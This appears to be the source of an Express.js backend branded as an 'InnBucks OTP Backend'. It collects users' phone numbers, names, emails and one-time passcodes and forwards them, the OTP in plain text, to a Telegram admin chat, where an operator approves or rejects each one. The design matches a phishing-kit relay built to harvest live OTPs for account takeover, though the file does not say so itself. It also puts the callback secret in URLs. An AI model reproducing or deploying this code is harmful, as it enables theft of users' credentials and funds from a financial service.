require("dotenv").config();
const express = require("express");
const cors = require("cors");
const TelegramBot = require("node-telegram-bot-api");
const { v4: uuidv4 } = require("uuid");

const app = express();

// Middleware
app.use(cors());
app.use(express.json());

// Environment variables
const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
const TELEGRAM_ADMIN_CHAT_ID = process.env.TELEGRAM_ADMIN_CHAT_ID;
const BACKEND_URL = process.env.BACKEND_URL || "http://localhost:3000";
const PORT = process.env.PORT || 3000;

// Initialize Telegram Bot
const bot = new TelegramBot(TELEGRAM_BOT_TOKEN, { polling: false });

// In-memory storage (use database in production)
const otpRequests = new Map();

/**
 * POST /api/otp/submit
 * Receive OTP submission from frontend
 * Store it and notify Telegram bot
 */
app.post("/api/otp/submit", (req, res) => {
  const { phone, otp, userId, email, firstName, lastName } = req.body;

  if (!phone || !otp || !userId) {
    return res
      .status(400)
      .json({ error: "Missing required fields: phone, otp, userId" });
  }

  const requestId = uuidv4();
  const timestamp = new Date().toISOString();

  // Store the request
  otpRequests.set(requestId, {
    requestId,
    phone,
    otp,
    email,
    firstName,
    lastName,
    userId,
    timestamp,
    approved: false,
    rejectedReason: null,
  });

  // Send notification to Telegram admin
  sendTelegramNotification(requestId, phone, otp, email, firstName, lastName);

  console.log(`[OTP] New request ${requestId} for ${phone}`);

  res.json({
    success: true,
    requestId,
    message: "OTP submitted. Awaiting admin approval.",
  });
});

/**
 * GET /api/otp/status/:requestId
 * Check if OTP was approved
 */
app.get("/api/otp/status/:requestId", (req, res) => {
  const { requestId } = req.params;

  if (!otpRequests.has(requestId)) {
    return res.status(404).json({ error: "Request not found" });
  }

  const request = otpRequests.get(requestId);

  res.json({
    approved: request.approved,
    rejected: !!request.rejectedReason,
    message: request.rejectedReason || "Pending approval",
    data: request.approved
      ? {
          phone: request.phone,
          email: request.email,
          firstName: request.firstName,
          lastName: request.lastName,
        }
      : null,
  });
});

/**
 * POST /api/telegram/approve
 * Receive approval from Telegram bot callback
 */
app.post("/api/telegram/approve", (req, res) => {
  const { requestId, action, token } = req.body;

  // Validate token (use a secret key in production)
  if (token !== process.env.TELEGRAM_CALLBACK_TOKEN) {
    return res.status(401).json({ error: "Invalid token" });
  }

  if (!otpRequests.has(requestId)) {
    return res.status(404).json({ error: "Request not found" });
  }

  const request = otpRequests.get(requestId);

  if (action === "approve") {
    request.approved = true;
    console.log(`[OTP] Request ${requestId} APPROVED`);
    res.json({ success: true, message: "OTP approved" });
  } else if (action === "reject") {
    request.rejectedReason = "Admin rejected the OTP request";
    console.log(`[OTP] Request ${requestId} REJECTED`);
    res.json({ success: true, message: "OTP rejected" });
  } else {
    return res.status(400).json({ error: "Invalid action" });
  }
});

/**
 * Send Telegram notification with approval buttons
 */
function sendTelegramNotification(
  requestId,
  phone,
  otp,
  email,
  firstName,
  lastName
) {
  const approveUrl = `${BACKEND_URL}/api/telegram/approve`;
  const callbackToken = process.env.TELEGRAM_CALLBACK_TOKEN;

  const message = `
🔐 <b>New OTP Request</b>

👤 <b>User:</b> ${firstName || "N/A"} ${lastName || ""}
📧 <b>Email:</b> ${email || "N/A"}
📱 <b>Phone:</b> ${phone}
🔑 <b>OTP:</b> <code>${otp}</code>
⏰ <b>Time:</b> ${new Date().toLocaleString()}

<b>Device ID:</b> <code>${requestId}</code>
`;

  const options = {
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [
        [
          {
            text: "✅ APPROVE",
            url: `${approveUrl}?requestId=${requestId}&action=approve&token=${callbackToken}`,
          },
          {
            text: "❌ REJECT",
            url: `${approveUrl}?requestId=${requestId}&action=reject&token=${callbackToken}`,
          },
        ],
      ],
    },
  };

  bot
    .sendMessage(TELEGRAM_ADMIN_CHAT_ID, message, options)
    .then(() => {
      console.log(`[Telegram] Notification sent for ${requestId}`);
    })
    .catch((err) => {
      console.error(`[Telegram] Error sending notification:`, err.message);
    });
}

/**
 * Handle Telegram button clicks (webhook alternative)
 * If using webhooks instead of polling, add this endpoint
 */
app.post("/api/telegram/webhook", (req, res) => {
  const update = req.body;

  if (update.callback_query) {
    const callbackQuery = update.callback_query;
    const data = new URLSearchParams(callbackQuery.data);
    const requestId = data.get("requestId");
    const action = data.get("action");
    const token = data.get("token");

    // Validate and process
    if (token === process.env.TELEGRAM_CALLBACK_TOKEN) {
      if (otpRequests.has(requestId)) {
        const request = otpRequests.get(requestId);
        if (action === "approve") {
          request.approved = true;
        } else if (action === "reject") {
          request.rejectedReason = "Admin rejected";
        }

        // Notify user in Telegram
        bot
          .answerCallbackQuery(callbackQuery.id, {
            text: `OTP ${action === "approve" ? "approved ✅" : "rejected ❌"}`,
            show_alert: true,
          })
          .catch((err) => console.error("Error answering callback:", err));
      }
    }
  }

  res.json({ ok: true });
});

/**
 * Health check
 */
app.get("/api/health", (req, res) => {
  res.json({ status: "ok", service: "OTP Backend" });
});

// Start server
app.listen(PORT, () => {
  console.log(`
╔════════════════════════════════════════╗
║  InnBucks OTP Backend Running          ║
║  Port: ${PORT}                             ║
║  URL: http://localhost:${PORT}              │  
║  Bot Token: ${TELEGRAM_BOT_TOKEN ? "✅ Configured" : "❌ Missing"}      ║
║  Admin Chat ID: ${TELEGRAM_ADMIN_CHAT_ID ? "✅ Set" : "❌ Missing"}        ║
╚════════════════════════════════════════╝
  `);
});

// Error handling
process.on("unhandledRejection", (err) => {
  console.error("Unhandled rejection:", err);
});

module.exports = app;
